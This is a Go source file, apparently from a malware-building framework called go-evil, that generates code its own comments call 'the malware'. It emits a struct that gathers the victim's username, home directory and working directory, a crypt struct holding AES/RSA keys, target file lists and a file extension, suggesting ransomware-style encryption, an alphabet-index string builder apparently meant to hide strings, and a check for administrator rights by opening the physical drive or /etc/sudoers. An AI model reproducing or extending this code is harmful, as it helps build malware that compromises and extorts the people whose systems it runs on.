package parsing

import (
	"regexp"

	"github.com/TeamPhoneix/go-evil/utility/structure"
)

//
//
// Generates the runtime variable struct (read rib) of the malware
//
//
func generate_runtime_variable(s_json string) string {
	data_object := structure.Receive(s_json)

	data_object.Add_go_struct([]string{
		"type var_t struct {",
		"values  []string",
		"foreach string",
		"roof int",
		"pointer int",
		"}"})

	data_object.Add_go_function([]string{
		"func (obj *var_t) set(value string) {",
		"obj.values[obj.pointer] = value",
		"obj.pointer++",
		"if obj.pointer >= obj.roof {",
		"obj.pointer = 0",
		"}}"})

	data_object.Add_go_function([]string{
		"func (obj *var_t) get(line string) string {",
		"regex := regexp.MustCompile(GRAB_VAR)",
		"result := regex.FindAllStringSubmatch(line, -1)",
		"toReturn := line",

		"if len(result) > 0 {",
		"for _, value := range result {",
		"i_number := tools.String_to_int(value[2])",
		"grabbed_value := \"NULL\"",
		"if i_number != -1 {",
		"if i_number > 0 && i_number < 5 {",
		"grabbed_value = obj.values[i_number-1]",
		"} else {",
		"switch i_number {",

		"case 13:",
		"grabbed_value = obj.foreach",

		"case 23:",
		"grabbed_value = tools.Grab_executable_name()",

		"case 39:",
		"grabbed_value = tools.Grab_CWD()",

		"case 40:",
		"grabbed_value = tools.Grab_home_dir()",

		"case 666:",
		"grabbed_value = tools.Grab_username()",

		"default:",
		"spine.log(fmt.Sprintf(\"Error, unknown value '%d'\", i_number))",

		"}",
		"}",
		"line = strings.ReplaceAll(line, value[1], grabbed_value)",
		"}",
		"}",
		"toReturn = line",
		"}",
		"return toReturn",
		"}"})

	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
	data_object.Add_go_import("regexp")
	data_object.Add_go_import("strings")
	data_object.Add_go_import("fmt")

	data_object.Add_go_const("GRAB_VAR = \"(€([0-9]+)€)\"")

	return structure.Send(data_object)
}

//
//
// Generates the crypto struct (read rib) of the malware
//
//
func generate_crypt(s_json string) string {
	data_object := structure.Receive(s_json)

	data_object.Add_go_struct([]string{
		"type crypt_t struct {",
		"method string",
		"target []string",
		"aes_key string",
		"aes_key_length int",
		"rsa_public rsa.PublicKey",
		"rsa_private *rsa.PrivateKey",
		"rsa_key_length int",
		"target_extension bool",
		"extension string",
		"}"})

	data_object.Add_go_function([]string{
		"func (obj *crypt_t) set_crypto(value string) {",
		"obj.method = value",
		"}"})

	data_object.Add_go_function([]string{
		"func (obj *crypt_t) set_aes_key(value string) {",
		"obj.aes_key = value",
		"obj.aes_key_length = len(value)",
		"}"})

	data_object.Add_go_function([]string{
		"func (obj *crypt_t) set_rsa_key(private_key *rsa.PrivateKey, key_length int) {",
		"obj.rsa_private = private_key",
		"obj.rsa_public = private_key.PublicKey",
		"obj.rsa_key_length = key_length",
		"}"})

	data_object.Add_go_function([]string{
		"func (obj *crypt_t) add_target(value string) {",
		"obj.target = append(obj.target, value)",
		"}"})

	data_object.Add_go_import("crypto/rsa")

	return structure.Send(data_object)
}

//
//
// Generates the alpha struct (read rib) of the malware
//
//
func generate_alpha(s_json string) string {
	data_object := structure.Receive(s_json)

	data_object.Add_go_struct([]string{
		"type alpha_t struct {",
		"alphabet []string",
		"}"})

	data_object.Add_go_function([]string{
		"func (obj *alpha_t) construct_string(value []int) string {",
		"to_return := \"\"",
		"for _, number := range value{",
		"to_return += obj.alphabet[number]",
		"}",
		"return to_return",
		"}"})

	return structure.Send(data_object)
}

//
//
// Generates the core struct (read spine) of each malware
//
//
func generate_spine(s_json string) string {
	data_object := structure.Receive(s_json)

	data_object.Add_go_struct([]string{
		"type spine_t struct {",
		"variable  var_t",
		"crypt crypt_t",
		"path string",
		"alpha alpha_t",
		"logging_lvl string",
		"is_admin bool",
		"}"})

	body := []string{"func (obj *spine_t) check_privileges(){"}

	if data_object.Target_os == "windows" {
		body = append(body, "_, err := os.Open(\"\\\\.\\\\PHYSICALDRIVE0\")")
	} else {
		body = append(body, "_, err := os.Open(\"/etc/sudoers\")")
	}

	body = append(body, "if err != nil{", "obj.is_admin = false", "}else{", "obj.is_admin = true", "}", "}")

	body = append(body, "func (obj *spine_t) log(msg string){", "notify.Log(msg, spine.logging_lvl, \"3\")", "}")

	data_object.Add_go_function(body)
	data_object.Add_go_import("os")
	data_object.Add_go_global("var spine spine_t")
	return structure.Send(data_object)

}

//
//
// Parses the data from the target file and generates function structures from it
// The gut contains the evil code that later on will be parsed
//
func Build_functions_structs(s_json string) string {
	data_object := structure.Receive(s_json)
	regex := regexp.MustCompile(FUNC)
	functions := regex.FindAllStringSubmatch(data_object.File_gut, -1)

	if len(functions) > 0 {
		for _, function := range functions {
			index := 3

			return_type := "null"
			f_type := function[1]
			name := function[2]

			if f_type == "c" {
				return_type = function[4]
				index = 5
			}

			gut := function[index : len(function)-1]

			data_object.Add_function(name, f_type, return_type, gut)

		}
	}
	return structure.Send(data_object)
}

//
//
// Generate differebnt structs
//
//
func generate_structs(s_json string) string {
	s_json = generate_runtime_variable(s_json)
	s_json = generate_crypt(s_json)
	s_json = generate_alpha(s_json)

	s_json = generate_spine(s_json)

	return s_json
}
